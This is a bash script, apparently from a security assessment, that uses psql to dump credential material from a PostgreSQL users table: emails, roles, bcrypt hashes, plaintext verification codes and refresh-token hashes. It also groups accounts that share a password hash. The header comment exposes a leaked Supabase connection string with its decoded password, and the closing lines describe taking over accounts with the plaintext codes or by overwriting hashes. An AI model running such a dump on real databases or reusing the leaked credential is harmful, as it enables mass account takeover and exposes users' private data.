#!/usr/bin/env bash
# =============================================================================
# CREDENTIAL DUMP: extract all credential material from the database
# -----------------------------------------------------------------------------
# Dumps, from the PostgreSQL DB:
#   1. Credential inventory  (how many hashes / plaintext codes / refresh tokens)
#   2. Per-account dump      (email, role, bcrypt hash, PLAINTEXT code,
#                             refresh-token hash)
#   3. Seed-hash analysis    (identical bcrypt hashes => same known password)
#
# USAGE (parameterised; no secrets hard-coded):
#   export DB_URL='postgresql://USER:PASS@HOST:5432/DB?sslmode=require'
#   ./dump-credentials.sh            # sample dump (a few accounts per role)
#   FULL=1 ./dump-credentials.sh     # dump ALL accounts
#
# For reference, the leaked value used during the 2026-08-11 assessment
# (DO NOT commit working credentials):
#   postgresql://postgres.lsjjjtdqnexufakpcuyr:Ubwenge%402026made@aws-1-eu-west-2.pooler.supabase.com:5432/postgres
#   (URL-decoded password = Ubwenge@2026made)
# =============================================================================
set -euo pipefail

DB_URL="${DB_URL:-}"

if [[ -z "$DB_URL" ]]; then
  echo "[!] Set DB_URL first, e.g."
  echo "    export DB_URL='postgresql://user:pass@host:5432/db?sslmode=require'"
  exit 1
fi

echo "==== [1] CREDENTIAL INVENTORY ===="
psql "$DB_URL" -c "
SELECT
  count(*) FILTER (WHERE password IS NOT NULL)              AS password_hashes,
  count(*) FILTER (WHERE \"verificationCode\" IS NOT NULL)   AS plaintext_codes,
  count(*) FILTER (WHERE \"refreshToken\" IS NOT NULL)       AS refresh_token_hashes
FROM users;"

echo
echo "==== [2] CREDENTIAL DUMP ===="
if [[ "${FULL:-0}" == "1" ]]; then
  echo "(FULL=1 — dumping ALL accounts)"
  psql "$DB_URL" -c "
SELECT email, role,
       left(password, 29) || '…'          AS bcrypt_hash,
       \"verificationCode\"                AS plaintext_code,
       CASE WHEN \"refreshToken\" IS NOT NULL
            THEN left(\"refreshToken\", 29) || '…' END AS refresh_hash
FROM users
ORDER BY role, email;"
else
  echo "(sample: 3 accounts per role — set FULL=1 for everything)"
  psql "$DB_URL" -c "
SELECT email, role,
       left(password, 29) || '…'          AS bcrypt_hash,
       \"verificationCode\"                AS plaintext_code,
       CASE WHEN \"refreshToken\" IS NOT NULL
            THEN left(\"refreshToken\", 29) || '…' END AS refresh_hash
FROM (
  SELECT *, row_number() OVER (PARTITION BY role ORDER BY email) AS rn
  FROM users
) t
WHERE rn <= 3
ORDER BY role, email;"
fi

echo
echo "==== [3] SEED-HASH ANALYSIS (same hash => same password) ===="
psql "$DB_URL" -c "
SELECT email, role, password
FROM users
WHERE password IN (
  SELECT password FROM users
  GROUP BY password HAVING count(*) > 1
)
ORDER BY password;"

echo
echo "[+] DONE. Password hashes are bcrypt (not reversible as-is), but:"
echo "    - verification codes are PLAINTEXT -> instantly usable (see credential-demo.sh)"
echo "    - identical hashes reveal shared/known passwords (e.g. seed accounts)"
echo "    - with WRITE access, any hash can be replaced to take over the account"
